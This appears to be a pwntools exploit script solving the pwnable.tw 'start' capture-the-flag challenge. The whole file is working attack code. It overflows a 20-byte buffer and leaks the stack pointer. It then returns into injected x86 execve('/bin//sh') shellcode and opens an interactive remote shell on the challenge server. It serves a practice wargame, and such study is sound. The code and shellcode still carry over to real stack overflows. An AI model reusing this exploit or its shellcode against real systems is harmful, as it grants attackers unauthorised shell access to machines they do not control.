#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

shellcode = """\
xor     eax, eax
push    eax
push    0x68732f2f
push    0x6e69622f
mov     ebx, esp
mov     ecx, eax
mov     edx, eax
mov     al, 0x0b
int     0x80
xor     eax, eax
inc     eax
int     0x80
"""

#conn = remote('localhost', 10000)
conn = remote('chall.pwnable.tw', 10000)
print conn.recvuntil(':')

message = 'A'*20 + p32(0x08048087)
conn.send(message)

res = conn.recv(20)
esp = u32(res[0:4])

payload = 'A'*20 + p32(esp+0x14)+asm(shellcode)
conn.sendline(payload)
conn.interactive()
